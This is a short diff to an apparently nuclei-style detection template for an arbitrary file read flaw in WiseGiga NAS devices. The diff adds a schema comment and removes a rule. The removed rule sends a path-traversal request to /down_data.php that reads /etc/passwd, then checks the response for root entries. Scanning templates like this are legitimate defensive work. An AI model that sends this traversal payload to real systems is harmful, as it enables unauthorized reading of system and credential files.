@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wisegiga-nas-down-data-php-file-read
 
 info:
@@ -9,12 +10,3 @@ info:
     app="WISEGIGA-NAS"
   reference:
     - http://wiki.peiqi.tech/wiki/webapp/WiseGiga/WiseGiga%20NAS%20down_data.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
-
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /down_data.php?filename=../../../../../../../../../../../../../../etc/passwd
-    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-expression: r0()
